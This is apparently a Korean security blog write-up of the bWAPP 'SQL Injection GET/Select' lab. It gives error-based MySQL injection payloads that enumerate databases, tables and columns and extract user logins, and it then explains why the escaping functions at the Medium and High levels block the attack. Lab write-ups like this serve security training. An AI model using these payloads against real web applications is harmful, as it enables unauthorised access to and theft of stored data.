---
layout: single
title: (bWAPP)SQL Injection GET/Select
categories: Web-vuln
tag: [sql injection, sql, injection, bwapp, bee box, GET, OWASP TOP 10, OWASP]
toc: true
author_profile: false
---
# 검증 로직
> Low Level 에서는 보안 대책이 적용되어 있지 않다.

## Level - Low
![그림 1-1](/assets/image/bwapp/injection/sqli-select-archive/sqli-select/image1.png)
- Select 기능이 존재하고 영화 제목을 질의할 수 있다. 또한 해당 질의의 응답으로 게시판 형식이 출력된다.
- 출력되는 레코드는 하나의 열만 출력하는 듯 하다.
- GET 형식으로 데이터가 전송된다.

```
bWAPP/sqli_2.php?movie=4&action=go
```

- GET 형식으로 날라갈 때 파라미터를 보게되면 movie 파라미터에 int 형식으로 전송된다.

![그림 1-2](/assets/image/bwapp/injection/sqli-select-archive/sqli-select/image2.png)

```
bWAPP/sqli_2.php?movie=1 and 1=1-- &action=go
```

- '(싱글쿼터) 입력시 DBMS Error 가 발생하며, MySQL 사용 유/무 및 Injection 취약 유/무를 확인했다.

> 해당 실습에서는 Error Based가 가능하여 해당 로직의 경우 Error Based 보다 UNION Based 가 시간적으로나 모든 면에서 효율적이나 실습을 위해 Error Based 로 진행하였다.

```sql
(SELECT 1 FROM (SELECT COUNT(*),concat(select schema_name from information_schema.schemata limit 0,1,FLOOR(rand(0)*2))x FROM information_schema.schemata GROUP BY x limit 0,1 )a)--
```

- 해당 구문을 통해 데이터베이스를 순차적으로 하나씩 확인이 가능하다.

```sql
(SELECT 1 FROM (SELECT COUNT(*),concat((select table_name from information_schema.tables where table_schema='bWAPP' limit 0,1),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x limit 0,1 )a)--
```

- 테이블 또한 위 구문을 통해 순차적으로 확인이 가능하다

```sql
(SELECT 1 FROM (SELECT COUNT(*),concat((select column_name from information_schema.columns where table_schema='bWAPP' and table_name='users' limit 0,1),FLOOR(rand(0)*2))x FROM information_schema.columns GROUP BY x limit 0,1 )a)--
```

- 컬럼명 조회를 위한 구문이며, 순차적으로 접근하며 login 컬럼이 발견되어 해당 컬럼에 대한 데이터 추출 시도를 하였다.

```sql
(SELECT 1 FROM (SELECT COUNT(*),concat((select login from bWAPP.users limit 0,1),FLOOR(rand(0)*2))x FROM information_schema.tables GROUP BY x limit 0,1 )a)--
```

![그림 1-3](/assets/image/bwapp/injection/sqli-select-archive/sqli-select/image3.png)
- 성공적으로 데이터를 추출했다.

## Medium & High

```php
function sqli_check_1($data)
{
    return addslashes($data)
}

function sqli_check_2($data)
{
    return mysql_real_escape_string($data);
}
```

1. Medium Level 에서는 addslahes() 함수를 사용하여 ‘(싱글쿼터 )를 입력하게되면 \ 를 앞에 붙여 ‘(싱글쿼터) 사용을 막고 있다. 해당 search 구문인 ‘%%’ 로 이루어져 있어 공격이 성립되지 않는다.
2. High Level 에서는 mysql_real_escape_string() 함수를 사용하여 메타문자를 방지하고 있다.
3. 해당 문제에서 Medium 과 High Level은 공격이 성립되지 않는다.